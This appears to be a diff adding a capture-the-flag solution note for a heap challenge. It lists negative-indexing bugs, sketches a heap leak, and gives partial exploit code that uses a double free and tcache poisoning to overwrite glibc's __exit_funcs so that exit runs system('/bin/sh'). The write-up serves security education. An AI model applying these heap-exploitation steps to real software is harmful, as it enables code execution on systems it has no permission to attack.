@@ -1,0 +1,42 @@
+this is the same code as pwintro2 -> same vulnerabilites
+
+
+vulnerabilites:
+-unchecked subtask-deletion: we can index the tasks and or subtasks negatively
+-unchecked task deletion: we can index the tasks negatively
+-unchecked creation: we can create subtasks for negative tasks
+    -we can place subtask addresses on the task list, because one thing in mains data segment points to itself(tasks[-11])
+    -_IO_2_1_stdout_ is before our tasks
+-somehow strrchr didn't remove the \n, because there was one behind in heap
+
+
+techniques:
+-leak heap: flood negative tasks w subtasks, create a normal sized subtask as task, one 0 size subtask as task, add subtasks to normal size task-> 
+            they point into subtasks of 0-task, add subtasks to 0 task, subtasks of normal task get overwritten with addresses of 0 subtasks
+            print subtasks of normal -> there is you addr
+
+
+# We already allocated the '/bin/sh' at offset 0x2c0
+#############  next | count  | type (cxa) | addr                             | arg               | not used
+onexit_fun = p64(0) + p64(1) + p64(4)     + encrypt(libc.sym['system'], key) + p64(heap + 0x2c0) + p64(0)  -- len(0x30) at 450
+add(onexit_fun)
+
+# So, how do we write this to the __exit_funcs pointer?
+# We can use the free()-primitive to get a double free
+# Then we can allocate one (setting the fwd pointer)
+# Note that glibc checks whether tcache chunks are properly aligned (multiple of 0x10)
+# As it is at an odd address, we have to allocate 8 bytes earlier and pad our string
+idx = chunk_idx
+add(b'0' * 24 + p64(0x21) + b'Z'*16) also len(0x30)
+delete(idx)
+free(heap + 0x4d0)
+
+# Now, when we allocate the chunk_t again (chunk idx), we can overwrite the fwd pointer,
+# which will be served in the next allocation
+# Important: We have to obfuscate the pointer!
+add(b'0' * 24 + p64(0x21) + p64((__exit_funcs - 8) ^ (heap >> 12)) + b'Y'*16)
+# Now, the next alloc returns the address __exit_funcs - 8, which we will overwrite
+# with our exit_function_list we allocated earlier
+add(b'\x00' * 8 + p64(heap + 0x450))
+
+CSCG{you_are_now_a_heap_hacking_champ}
